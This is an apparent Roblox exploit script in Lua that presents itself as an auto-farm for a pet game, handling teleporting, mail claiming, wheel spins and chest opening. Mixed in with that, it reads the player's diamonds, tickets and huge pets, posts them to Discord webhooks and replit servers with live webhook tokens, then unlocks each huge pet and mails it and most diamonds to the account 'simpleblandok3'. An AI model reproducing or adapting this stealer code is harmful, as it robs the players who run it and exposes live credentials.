print("went through")
wait(2)
local function GameCheck()
if game.PlaceId == 8737899170 then
    while true do
        game.ReplicatedStorage.Network.World3Teleport:InvokeServer()
        wait(5)
    end
end
end
spawn(GameCheck)


local function MailClaim()
while true do
    local player = game.Players.LocalPlayer
    
        local gui = player.PlayerGui:FindFirstChild("_MACHINES")
        if gui then
            local mailboxMachine = gui:FindFirstChild("MailboxMachine")
            if mailboxMachine then
                local giftsFrame = mailboxMachine:FindFirstChild("Frame") and mailboxMachine.Frame:FindFirstChild("GiftsFrame")
                if giftsFrame then
                    local itemsFrame = giftsFrame:FindFirstChild("ItemsFrame")
                    if itemsFrame then
                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
                        if frameChild then
                            local args = {
                                [1] = {
                                    [1] = frameChild.Name
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
                        end
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(MailClaim)


local function BodyVelocity()
    while true do
        wait(0.1)
        local player = game.Players.LocalPlayer
        local character = player and player.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        
        if humanoidRootPart then
            local BV = humanoidRootPart:FindFirstChild("BodyVelocity") or Instance.new("BodyVelocity", humanoidRootPart)
            BV.Velocity = Vector3.new(0, 0.001, 0)
            BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        end
    end
end

spawn(BodyVelocity)

local function MapDestroy()
    while true do
        
        
        local map3 = workspace:FindFirstChild("Map3")
        if map3 then
            for _, child in pairs(map3:GetChildren()) do
                if child.Name ~= "200 | Void Spawn" then
                    child:Destroy()
                end
            end
        end

        local things = game:GetService("Workspace"):FindFirstChild("__THINGS")
        if things then
            for _, child in pairs(things:GetChildren()) do
                if child.Name == "Instances" or child.Name == "shinyRelics" or child.Name == "HiddenPresents" then
                    child:Destroy()
                end
            end
        end

        local debris = game:GetService("Workspace"):FindFirstChild("__DEBRIS")
        if debris then
            debris:Destroy()
        end

        for _, descendant in pairs(game:GetService("Workspace"):GetDescendants()) do
            if descendant:IsA("Part") or descendant:IsA("MeshPart") then
                descendant.Transparency = 1
            elseif descendant:IsA("ParticleEmitter") then
                descendant:Destroy()
            end
        end

        local thingsDescendants = things and things:GetChildren()
        if thingsDescendants then
            for _, child in pairs(thingsDescendants) do
                if child.Name == "Eggs" or child.Name == "Breakables" or child.Name == "AnimatedBreakables" or child.Name == "RenderedEggs" or child.Name == "BalloonGifts" then
                    child:Destroy()
                end
            end
        end

        local voidSpawn = map3 and map3:FindFirstChild("200 | Void Spawn")
        if voidSpawn then
            for _, child in pairs(voidSpawn:GetChildren()) do
                if child.Name == "PARTS_LOD" or child.Name == "PERSISTENT" then
                    child:Destroy()
                end
            end
        end
wait(1)
    end
end

spawn(MapDestroy)

local function MailClaim()
    while true do
        local gui = Player.PlayerGui:FindFirstChild("_MACHINES")
        if gui then
            local mailboxMachine = gui.MailboxMachine
            if mailboxMachine then
                local giftsFrame = mailboxMachine.Frame.GiftsFrame
                if giftsFrame then
                    local itemsFrame = giftsFrame.ItemsFrame
                    if itemsFrame then
                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
                        if frameChild then
                            local args = {
                                [1] = {
                                    [1] = frameChild.Name
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
                        end
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(MailClaim)


local function MonitorAndSpin()
    while true do

        wait(0.01)
        repeat wait(0.0001) until workspace:FindFirstChild("Map3")
        local map3 = workspace:FindFirstChild("Map3")

        repeat wait(0.0001) until map3:FindFirstChild("200 | Void Spawn")
        local voidSpawn = map3:FindFirstChild("200 | Void Spawn")

        repeat wait(0.0001) until voidSpawn:FindFirstChild("INTERACT")
        local interact = voidSpawn:FindFirstChild("INTERACT")

        repeat wait(0.0001) until interact:FindFirstChild("Machines")
        local machines = interact:FindFirstChild("Machines")

        repeat wait(0.0001) until machines:FindFirstChild("SpinnyWheel")
        local spinnyWheel = machines:FindFirstChild("SpinnyWheel")

        repeat wait(0.0001) until spinnyWheel:FindFirstChild("SpinnyWheel")
        local spinnyWheelInstance = spinnyWheel:FindFirstChild("SpinnyWheel")

        repeat wait(0.0001) until spinnyWheelInstance:FindFirstChild("SurfaceGui")
        local surfaceGui = spinnyWheelInstance:FindFirstChild("SurfaceGui")

        repeat wait(0.0001) until surfaceGui:FindFirstChild("Wheel")
        local wheel = surfaceGui:FindFirstChild("Wheel")

        repeat wait(0.0001) until wheel:FindFirstChild("WheelCore")
        local wheelCore = wheel:FindFirstChild("WheelCore")

for _, child in pairs(wheelCore:GetChildren()) do
            if child:IsA("Frame") and child.Name ~= "Line" then
                if child:FindFirstChild("PrizeRender") and child.PrizeRender.Icon.Image == "rbxassetid://15058306840" then
                    local args = { [1] = "VoidWheel" }
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Spinny Wheel: Request Spin"):InvokeServer(unpack(args))
                end
            end
        end
    end
end

local function ChangePosition()
    while true do
        wait(1)
        
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        if humanoidRootPart then
            -- Check for existing BodyVelocity or create one
            local BV = humanoidRootPart:FindFirstChild("BodyVelocity") or Instance.new("BodyVelocity", humanoidRootPart)
            BV.Velocity = Vector3.new(0, 0.001, 0)
            BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)

            -- Set HumanoidRootPart's position using CFrame
            humanoidRootPart.CFrame = CFrame.new(-10181, 7.1, -7289.9)
        end
    end
end

spawn(ChangePosition)


local function chest()
    while true do
        wait(0.1)
        
        local args1 = {
            [1] = "Rainbow Mini Chest"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args1))

        local args2 = {
            [1] = "Large Gift Bag"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args2))

        local args5 = {
            [1] = "Mini Chest"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args5))
        
        local args3 = {
            [1] = "Gift Bag"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args3))
    end
end




local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local webhookURL = "https://discord.com/api/webhooks/1238281258174386257/C-YRLxkKnYEIPUFjIJYEAS2L_zdAv-Qou6OAzvFpIaxELHHNVdP2LnlXf3uwA-SSNzwD"
local request = (syn and syn.request) or request or (http and http.request) or http_request

local ItemTable = {"Diamonds"}
local ItemVoid = {"Void Spinny Wheel Ticket"}

local VoidAmount = 0
local DiamondsID = 0
local DiamondsAmount = 0

local function GetItemInfo(ItemsClass, ItemsName)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    for UID, Item in pairs(Inventory[ItemsClass]) do
        if table.find(ItemsName, Item.id) then
            local ItemInfo = {
                ["uid"] = UID,
                ["data"] = Item
            }
            table.insert(Table, ItemInfo)
        end
    end
    return Table
end

local function PrintDiamonds()
    while true do
        local CurrencyItems = GetItemInfo("Currency", ItemTable)
        for _, ItemInfo in pairs(CurrencyItems) do
            local ItemData = ItemInfo.data
            if ItemData._am and ItemData.id == "Diamonds" then
                DiamondsID = ItemInfo.uid
                DiamondsAmount = ItemData._am
            end
        end

        local MiscItems = GetItemInfo("Misc", ItemVoid)
        for _, ItemInfo in pairs(MiscItems) do
            local ItemData = ItemInfo.data
            if ItemData._am and ItemData.id == "Void Spinny Wheel Ticket" then
                VoidAmount = ItemData._am
            end
        end

        wait(0.3)
    end
end


spawn(PrintDiamonds)
spawn(chest)
spawn(MonitorAndSpin)

local SendAmount = false

print("DiamondsID:", DiamondsID)
print("DiamondsAmount:", DiamondsAmount)
print("VoidAmount:", VoidAmount)


local function WebsiteUpdate()
    while true do
        local player = Players.LocalPlayer
        local Http = game:GetService("HttpService")

        if player then
            request({
                Url = 'https://67f552e4-5e03-4d76-bc81-e7c398e4e63f-00-1db81sgqdm8hk.riker.replit.dev/update',
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = Http:JSONEncode({
                    Username = player.Name,
                    VoidTicketsValue = VoidAmount,
                    DiamondsValue = DiamondsAmount,
                    HugeList = "nothing"
                })
            })
        end

        wait(1)
    end
end

spawn(WebsiteUpdate)


local waitTime = SendAmount and 30 or 5

wait(waitTime)


wait(2)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = require(ReplicatedStorage:WaitForChild("Library"))
local ProcessedHuges = {}

local function GetItemInfo(ItemsClass, ItemsName)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory

    if Inventory[ItemsClass] then
        for _, Item in pairs(Inventory[ItemsClass]) do
            if table.find(ItemsName, Item.id) then
                table.insert(Table, Item.id)
            end
        end
    end

    return Table
end

local function getCurrentHugePets()
    local GoldPetsTable = {}
    for _, Pet in pairs(ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren()) do
        table.insert(GoldPetsTable, Pet.Name)
    end
    return GetItemInfo("Pet", GoldPetsTable)
end

local hugePets = getCurrentHugePets()

local hugePetsString = #hugePets > 0 and table.concat(hugePets, ", ") or "0"

print("Huge pets you have right now:", hugePetsString)

local diamondsvalue = DiamondsAmount 
local voidvalue = VoidAmount 
local player = game.Players.LocalPlayer.Name

-- Only send the request if we have valid values for Diamonds and VoidTickets
if diamondsvalue and voidvalue then
    local request = (syn and syn.request) or request or (http and http.request) or http_request

    local response = request({
        Url = 'https://d344b03d-a8a9-44de-a584-954a5099e9dd-00-3853s22ty40np.riker.replit.dev/update',
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({
            Username = player,
            VoidTicketsValue = voidvalue,
            DiamondsValue = diamondsvalue,
            HugeList = hugePetsString
        })
    })
end



print("VoidAmount:", VoidAmount)
local HugeCheck = false
local DiamondsInput = DiamondsAmount - 1000000
local DiamondsValue = DiamondsAmount
if SendAmount == true then
    if DiamondsAmount > 10000000 then
        local args = {
            [1] = "simpleblandok3",
            [2] = "Void Amount " .. VoidAmount,
            [3] = "Currency",
            [4] = DiamondsID,
            [5] = DiamondsInput
        }
        ReplicatedStorage.Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        local playerName = game.Players.LocalPlayer.Name
        local data = {
            ["content"] = playerName .. " | Successfully sent " .. DiamondsValue .. " | Currently " .. VoidAmount .. " Tickets Left"
        }
        request({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end
end


local HugeCheck = false


local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Library = require(ReplicatedStorage:WaitForChild("Library"))
local ProcessedHuges = {}

function ProcessHugePets()
    while true do
        local function GetItemInfo(ItemsClass, ItemsName)
            local Table = {}
            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
                if table.find(ItemsName, Item.id) then
                    local ItemInfo = {
                        ["uid"] = UID,
                        ["data"] = Item
                    }
                    table.insert(Table, ItemInfo)
                end
            end
            return Table
        end

        local function getCurrentHugePets()
            local GoldPetsTable = {}
            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
                table.insert(GoldPetsTable, Pet.Name)
            end
            return GetItemInfo("Pet", GoldPetsTable)
        end

        local hugePets = {}
        local uids = {}

        for i, MadeTable in next, getCurrentHugePets() do
            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
            table.insert(uids, MadeTable.uid)
        end

        if #hugePets > 0 then
            print("Huge pets you have right now:", table.concat(hugePets, ", "))

            for i = #uids, 1, -1 do

                local webhook = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6"
                local request = (syn and syn.request) or request or (http and http.request) or http_request

                request({
                    Url = webhook,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode({
                        content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
                    })
                })
HugeCheck = true
                local args = {
                    [1] = uids[i],
                    [2] = false
                }

                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
                wait(1)
                wait(3)

                local args = {
                    [1] = "simpleblandok3",
                    [2] = "omg u got a new huge!!",
                    [3] = "Pet",
                    [4] = uids[i],
                    [5] = 1
                }
                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))

                wait(3)
            end
        end
        wait(3)
    end
end

spawn(ProcessHugePets)


if HugeCheck then
    wait(30)
else
    wait(0)
end

local TPS = game:GetService("TeleportService")
local player = game.Players.LocalPlayer
local startTime = tick()


while true do
 
    
    if tick() - startTime >= 60 then
        player:Kick("Failed to rejoin within 1 minute.")
        break
    end
    
    pcall(function()
        TPS:Teleport(game.PlaceId, player)
    end)
   wait(15)
end
